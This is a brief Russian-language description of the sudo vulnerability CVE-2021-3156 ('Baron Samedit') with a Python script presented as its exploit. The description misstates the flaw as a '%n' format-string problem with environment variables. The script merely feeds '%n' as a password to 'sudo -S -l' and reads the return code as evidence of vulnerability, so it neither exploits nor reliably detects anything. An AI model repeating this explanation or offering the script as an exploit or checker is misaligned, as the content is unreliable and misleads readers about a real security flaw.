# CVE-2021-3156: Данная уязвимость связана с ошибкой в реализации утилиты sudo в Linux-системах. Она известна как "Baron Samedit". Суть проблемы состоит в некорректной обработке escape-последовательностей при работе с переменными окружения. Атакующий может создать специальную команду с символом %n, который приведет к перезаписи памяти и дальнейшему повышению привилегий до уровня суперпользователя.

```python
import subprocess

def exploit_sudo_bug():
    try:
        # Формирование специальной команды с использованием %n
        cmd = ['sudo', '-S', '-l']
        
        # Используем символ "%n" для эмуляции возможности записи в память
        input_data = b'%n\\n'
        
        # Выполняем команду и передаем ей данные
        result = subprocess.run(cmd, input=input_data, capture_output=True)
        
        # Анализируем выход
        if result.returncode != 0 or b'Sorry' in result.stderr:
            print("[-] Уязвимость не подтверждена.")
        else:
            print("[+] Потенциальная уязвимость обнаружена!")
            
    except Exception as e:
        print(f"[!] Произошла ошибка: {e}")

exploit_sudo_bug()
```
